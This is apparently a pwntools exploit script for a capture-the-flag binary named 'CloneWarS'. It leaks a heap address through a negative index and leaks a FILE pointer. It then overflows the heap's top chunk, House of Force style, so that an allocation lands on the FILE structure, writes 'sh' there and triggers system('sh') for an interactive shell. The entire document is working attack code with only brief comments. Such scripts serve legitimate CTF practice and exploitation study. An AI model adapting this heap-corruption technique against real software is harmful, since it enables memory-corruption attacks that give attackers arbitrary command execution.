from pwn import *
r=process("./CloneWarS")
elf = ELF("./CloneWarS")
context.arch = 'amd64'

def r2d2(n):
    r.sendlineafter('Your choice: ', '2')
    r.sendlineafter('R2? ', '2')
def pstarships(size, kind, capacity):
    r.sendlineafter('Your choice: ', '3')
    r.sendlineafter('Master, the amount of starships: ', str(size))
    r.sendlineafter('What kind of starships?: ', kind)
    r.sendlineafter('Capacity of troopers in the starships: ', str(capacity))
def buildDeathStar(size):                                                                            
    r.sendlineafter('Your choice: ', '1')
    r.sendlineafter('Assemble death star: ',str(size))
    
# LEAKING HEAP
pstarships(0x30, 'A', 0x30)
r2d2(-1)
r.recvuntil('R2D2 IS .... ')
HEAP_L = int(r.recvregex(r'(\d+) '))

# OVERFLOW TOP_CHUNK
pstarships(0x30, "FF", 0x40) # Overflow Top Chunk

# LEAK FILE PTR
r.sendlineafter('Your choice: ', '6')
r.recvuntil('File is at: ')
FILE = int(r.recvline().rstrip())
log.info("FILE ADDR 0x%x" % FILE)
HEAP = HEAP_L-0x1380 # HEAPBASE
SIZE_OF_LONG = 0x8 # sizeof(long) -> 8 in 64 bits
WILD_OFFSET = 0x12e0 # Current TOP_CHUNK offset
TOP_CHUNK = HEAP+WILD_OFFSET+SIZE_OF_LONG*4
r.sendlineafter('Your choice: ', '1')
buildDeathStar(FILE-TOP_CHUNK) # Calculate the evil size required to write to FILE
r.sendlineafter('Your choice: ', '4')
r.sendlineafter('What kind of troopers?: ', 'sh') # Modify file with sh
r.sendlineafter('Your choice: ', '6') # Trigger system("sh")
r.interactive()
r.close()
                      

